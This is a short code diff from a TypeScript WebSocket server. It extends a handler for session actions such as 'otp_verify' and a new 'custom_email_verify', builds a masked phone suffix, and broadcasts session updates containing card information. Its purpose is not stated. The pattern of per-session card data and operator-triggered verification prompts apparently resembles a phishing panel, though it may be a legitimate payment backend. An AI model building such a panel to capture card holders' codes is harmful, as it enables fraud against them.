@@ -367,9 +367,9 @@ export async function setupWebSocket(server: any) {
               broadcast('session_update', { sessionId, cardInfo: { ...(s as any).cardInfo } }, sessionId);
             } catch {}
           }
-          if (action === 'otp_verify' || action === 'custom_otp_tail') {
+          if (action === 'otp_verify' || action === 'custom_otp_tail' || action === 'custom_email_verify') {
             phoneSuffix = action === 'custom_otp_tail' ? (message || '****') : '';
-            if (!phoneSuffix && s) {
+            if (!phoneSuffix && s && action === 'otp_verify') {
               const phone = (s as any).customerInfo?.phone || '';
               phoneSuffix = phone.replace(/\D/g, '').slice(-4) || '****';
             }
